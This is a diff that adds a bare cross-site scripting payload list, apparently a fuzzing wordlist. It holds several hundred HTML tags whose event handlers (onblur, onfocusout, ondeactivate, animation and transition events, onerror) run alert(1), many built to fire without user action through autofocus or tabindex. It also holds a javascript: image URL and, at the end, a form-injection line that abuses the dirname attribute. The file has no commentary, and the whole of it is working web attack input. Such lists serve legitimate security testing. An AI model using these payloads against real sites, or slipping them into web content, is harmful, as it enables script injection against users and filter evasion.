@@ -1,0 +1,388 @@
+<input autofocus onblur=alert(1)>
+<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>
+<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>
+<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
+<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>
+<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>
+<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
+<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>
+<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>
+<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocusin=alert(1)>
+<input draggable="true" ondrag="alert(1)">test</input>
+<input draggable="true" ondragend="alert(1)">test</input>
+<input draggable="true" ondragenter="alert(1)">test</input>
+<input draggable="true" ondragleave="alert(1)">test</input>
+<input draggable="true" ondragstart="alert(1)">test</input>
+<input id=x onfocus=alert(1)>
+<input id=x onfocusin=alert(1)>
+<input id=x tabindex=1 onactivate=alert(1)></input>
+<input id=x tabindex=1 onbeforeactivate=alert(1)></input>
+<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>
+<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>
+<input onauxclick=alert(1)>
+<input onbeforecopy=alert(1) value="XSS" autofocus>
+<input onbeforecut=alert(1) value="XSS" autofocus>
+<input onbeforepaste=alert(1) value="" autofocus>
+<input onblur=alert(1) id=x><input autofocus>
+<input onchange=alert(1) value=xss>
+<input onclick="alert(1)">test</input>
+<input oncontextmenu="alert(1)">test</input>
+<input oncopy=alert(1) value="XSS" autofocus>
+<input oncut=alert(1) value="XSS" autofocus>
+<input ondblclick="alert(1)">test</input>
+<input onfocusout=alert(1) id=x><input autofocus>
+<input oninput=alert(1) value=xss>
+<input onkeydown="alert(1)" contenteditable>test</input>
+<input onkeypress="alert(1)" contenteditable>test</input>
+<input onkeyup="alert(1)" contenteditable>test</input>
+<input onmousedown="alert(1)">test</input>
+<input onmouseenter="alert(1)">test</input>
+<input onmouseleave="alert(1)">test</input>
+<input onmousemove="alert(1)">test</input>
+<input onmouseout="alert(1)">test</input>
+<input onmouseover="alert(1)">test</input>
+<input onmouseup="alert(1)">test</input>
+<input onpaste=alert(1) value="" autofocus>
+<input onselect=alert(1) value="XSS" autofocus>
+<input type=checkbox id=x onfocus=alert(1)>
+<input type=checkbox id=x onfocusin=alert(1)>
+<input type=image onloadend=alert(1) src=validimage.png>
+<input type=image onloadstart=alert(1) src=validimage.png>
+<input type=image src=1 onerror=alert(1)>
+<input type=image src=validimage.png onload=alert(1)>
+<input type=radio id=x onfocus=alert(1)>
+<input type=radio id=x onfocusin=alert(1)>
+<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>
+<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>
+<ins onblur=alert(1) tabindex=1 id=x></ins><input autofocus>
+<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>
+<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>
+<isindex id=x tabindex=1 ondeactivate=alert(1)></isindex><input id=y autofocus>
+<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>
+<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>
+<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>
+<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>
+<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>
+<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>
+<keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>
+<keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>
+<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>
+<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>
+<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>
+<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>
+<label onblur=alert(1) tabindex=1 id=x></label><input autofocus>
+<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>
+<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>
+<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>
+<legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>
+<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>
+<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>
+<li id=x tabindex=1 ondeactivate=alert(1)></li><input id=y autofocus>
+<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>
+<li onfocusout=alert(1) tabindex=1 id=x></li><input autofocus>
+<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>
+<link id=x tabindex=1 ondeactivate=alert(1)></link><input id=y autofocus>
+<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>
+<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>
+<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>
+<listing id=x tabindex=1 ondeactivate=alert(1)></listing><input id=y autofocus>
+<listing onblur=alert(1) tabindex=1 id=x></listing><input autofocus>
+<listing onfocusout=alert(1) tabindex=1 id=x></listing><input autofocus>
+<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>
+<main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>
+<main onblur=alert(1) tabindex=1 id=x></main><input autofocus>
+<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>
+<map id=x tabindex=1 onbeforedeactivate=alert(1)></map><input autofocus>
+<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>
+<map onblur=alert(1) tabindex=1 id=x></map><input autofocus>
+<map onfocusout=alert(1) tabindex=1 id=x></map><input autofocus>
+<mark id=x tabindex=1 onbeforedeactivate=alert(1)></mark><input autofocus>
+<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>
+<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>
+<mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>
+<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>
+<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input id=y autofocus>
+<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>
+<marquee onfocusout=alert(1) tabindex=1 id=x></marquee><input autofocus>
+<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>
+<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>
+<menu onblur=alert(1) tabindex=1 id=x></menu><input autofocus>
+<menu onfocusout=alert(1) tabindex=1 id=x></menu><input autofocus>
+<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>
+<menuitem id=x tabindex=1 ondeactivate=alert(1)></menuitem><input id=y autofocus>
+<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>
+<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>
+<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>
+<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>
+<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>
+<meter id=x tabindex=1 ondeactivate=alert(1)></meter><input id=y autofocus>
+<meter onblur=alert(1) tabindex=1 id=x></meter><input autofocus>
+<meter onfocusout=alert(1) tabindex=1 id=x></meter><input autofocus>
+<multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>
+<multicol id=x tabindex=1 ondeactivate=alert(1)></multicol><input id=y autofocus>
+<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>
+<multicol onfocusout=alert(1) tabindex=1 id=x></multicol><input autofocus>
+<nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>
+<nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>
+<nav onblur=alert(1) tabindex=1 id=x></nav><input autofocus>
+<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>
+<nextid id=x tabindex=1 onbeforedeactivate=alert(1)></nextid><input autofocus>
+<nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>
+<nextid onblur=alert(1) tabindex=1 id=x></nextid><input autofocus>
+<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>
+<nobr id=x tabindex=1 onbeforedeactivate=alert(1)></nobr><input autofocus>
+<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>
+<nobr onblur=alert(1) tabindex=1 id=x></nobr><input autofocus>
+<nobr onfocusout=alert(1) tabindex=1 id=x></nobr><input autofocus>
+<noembed id=x tabindex=1 onbeforedeactivate=alert(1)></noembed><input autofocus>
+<noembed id=x tabindex=1 ondeactivate=alert(1)></noembed><input id=y autofocus>
+<noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>
+<noembed onfocusout=alert(1) tabindex=1 id=x></noembed><input autofocus>
+<noframes id=x tabindex=1 onbeforedeactivate=alert(1)></noframes><input autofocus>
+<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>
+<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>
+<noframes onfocusout=alert(1) tabindex=1 id=x></noframes><input autofocus>
+<noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>
+<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input id=y autofocus>
+<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>
+<noscript onfocusout=alert(1) tabindex=1 id=x></noscript><input autofocus>
+<object id=x tabindex=1 onbeforedeactivate=alert(1)></object><input autofocus>
+<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>
+<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>
+<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>
+<ol id=x tabindex=1 onbeforedeactivate=alert(1)></ol><input autofocus>
+<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>
+<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>
+<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>
+<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>
+<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>
+<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>
+<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>
+<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>
+<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>
+<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>
+<option onfocusout=alert(1) tabindex=1 id=x></option><input autofocus>
+<output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>
+<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>
+<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>
+<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>
+<p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>
+<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>
+<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>
+<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>
+<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>
+<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>
+<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>
+<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>
+<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>
+<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>
+<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>
+<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>
+<plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>
+<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>
+<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>
+<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>
+<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>
+<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>
+<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>
+<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>
+<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>
+<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>
+<progress onblur=alert(1) tabindex=1 id=x></progress><input autofocus>
+<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>
+<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>
+<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>
+<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>
+<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>
+<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>
+<rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>
+<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>
+<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>
+<rp id=x tabindex=1 onbeforedeactivate=alert(1)></rp><input autofocus>
+<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>
+<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>
+<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>
+<rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>
+<rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>
+<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>
+<rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>
+<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>
+<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>
+<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>
+<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>
+<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>
+<ruby onfocusout=alert(1) tabindex=1 id=x></ruby><input autofocus>
+<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>
+<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>
+<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>
+<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>
+<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>
+<samp id=x tabindex=1 ondeactivate=alert(1)></samp><input id=y autofocus>
+<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>
+<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>
+<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>
+<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>
+<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>
+<script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>
+<section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>
+<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>
+<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>
+<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>
+<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>
+<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>
+<select onblur=alert(1) id=x></select><input autofocus>
+<select onfocusout=alert(1) id=x></select><input autofocus>
+<shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>
+<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>
+<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>
+<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>
+<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>
+<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>
+<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>
+<slot onfocusout=alert(1) tabindex=1 id=x></slot><input autofocus>
+<small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>
+<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>
+<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>
+<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>
+<source id=x tabindex=1 onbeforedeactivate=alert(1)></source><input autofocus>
+<source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>
+<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>
+<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>
+<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>
+<spacer id=x tabindex=1 ondeactivate=alert(1)></spacer><input id=y autofocus>
+<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>
+<spacer onfocusout=alert(1) tabindex=1 id=x></spacer><input autofocus>
+<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>
+<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>
+<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>
+<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>
+<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>
+<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>
+<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>
+<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>
+<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>
+<strong id=x tabindex=1 ondeactivate=alert(1)></strong><input id=y autofocus>
+<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>
+<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>
+<style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>
+<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>
+<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>
+<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>
+<style>:target {color: red;}</style><input id=x style="transition:color 10s" ontransitioncancel=alert(1)></input>
+<style>:target {color:red;}</style><input id=x style="transition:color 1s" ontransitionend=alert(1)></input>
+<style>:target {transform: rotate(180deg);}</style><input id=x style="transition:transform 2s" ontransitionrun=alert(1)></input>
+<style>@keyframes slidein {}</style><input style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></input>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style="position:absolute;" onanimationcancel="alert(1)"></input>
+<style>@keyframes x{}</style><input style="animation-name:x" onanimationend="alert(1)"></input>
+<style>@keyframes x{}</style><input style="animation-name:x" onanimationstart="alert(1)"></input>
+<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>
+<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>
+<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>
+<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>
+<summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>
+<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>
+<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>
+<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>
+<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>
+<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>
+<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>
+<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>
+<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>
+<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>
+<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>
+<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>
+<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>
+<table onblur=alert(1) tabindex=1 id=x></table><input autofocus>
+<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>
+<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>
+<tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>
+<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>
+<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>
+<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>
+<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>
+<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>
+<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>
+<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>
+<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>
+<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>
+<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>
+<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>
+<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>
+<textarea onblur=alert(1) id=x></textarea><input autofocus>
+<textarea onfocusout=alert(1) id=x></textarea><input autofocus>
+<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>
+<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>
+<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>
+<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>
+<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>
+<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>
+<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>
+<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
+<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>
+<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>
+<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>
+<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>
+<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>
+<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>
+<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>
+<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>
+<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>
+<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>
+<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>
+<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>
+<tr id=x tabindex=1 onbeforedeactivate=alert(1)></tr><input autofocus>
+<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>
+<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>
+<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>
+<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>
+<track id=x tabindex=1 ondeactivate=alert(1)></track><input id=y autofocus>
+<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>
+<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>
+<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>
+<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>
+<tt onblur=alert(1) tabindex=1 id=x></tt><input autofocus>
+<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>
+<u id=x tabindex=1 onbeforedeactivate=alert(1)></u><input autofocus>
+<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>
+<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>
+<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>
+<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>
+<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>
+<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>
+<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>
+<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>
+<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>
+<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>
+<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>
+<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>
+<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>
+<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>
+<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>
+<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>
+<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>
+<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>
+<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>
+<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>
+<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>
+<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>
+<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>
+<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>
+<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
+<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>
+<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<input name="secret" type="password">
+<input name="username" value="admin" />
+<input name="password" type="password" value="secret" />
+<input name="injected" value="injected" dirname="password" />
+<input type="submit">
